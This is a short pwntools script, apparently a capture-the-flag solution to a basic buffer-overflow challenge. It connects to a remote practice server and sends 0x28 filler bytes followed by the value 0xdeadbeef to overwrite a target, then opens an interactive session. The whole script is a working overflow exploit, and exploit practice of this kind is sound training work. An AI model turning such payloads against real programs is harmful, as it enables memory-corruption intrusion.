from pwn import *

# p = process("./bof_basic")

# nc ctf.j0n9hyun.xyz 3000
p = remote("ctf.j0n9hyun.xyz", 3000)

win = 0xdeadbeef

pay = b''
pay += b"A" * 0x28
pay += p32(win)

p.sendline(pay)

p.interactive()